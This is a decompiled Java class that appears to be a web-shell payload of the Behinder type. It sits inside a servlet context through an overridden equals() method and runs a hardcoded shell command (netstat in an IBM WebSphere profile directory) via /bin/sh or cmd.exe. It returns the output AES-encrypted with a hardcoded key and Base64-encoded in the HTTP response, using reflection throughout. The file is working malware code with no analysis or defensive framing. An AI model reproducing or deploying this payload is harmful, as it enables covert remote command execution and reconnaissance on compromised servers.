/*
 * Decompiled with CFR 0.152.
 */
package com.hubom;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Ztrgdgm {
    public static String cmd;
    public static String path;
    public static String whatever;
    private static String status;
    private Object Request;
    private Object Response;
    private Object Session;

    public Ztrgdgm() {
        cmd = "";
        cmd = cmd + "cd /IBM/WebSphere/AppServer/profiles/AppSrv01/ ;netstat -atnlp";
        path = "";
        path = path + "/IBM/WebSphere/AppServer/profiles/AppSrv01/";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block10: {
            HashMap<String, String> result = new HashMap<String, String>();
            this.fillContext(obj);
            result.put("msg", this.RunCMD(cmd));
            result.put("status", status);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception so) {}
            break block10;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "fail");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception exception) {}
            }
        }
        return true;
    }

    private String RunCMD(String cmd) throws Exception {
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        String result = "";
        if (cmd != null && cmd.length() > 0) {
            Process p = System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 ? Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd}) : Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));
            String disr = br.readLine();
            while (disr != null) {
                result = result + disr + "\n";
                disr = br.readLine();
            }
            br = new BufferedReader(new InputStreamReader(p.getErrorStream(), osCharset));
            disr = br.readLine();
            while (disr != null) {
                result = result + disr + "\n";
                disr = br.readLine();
            }
        }
        return result;
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    static {
        status = "success";
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
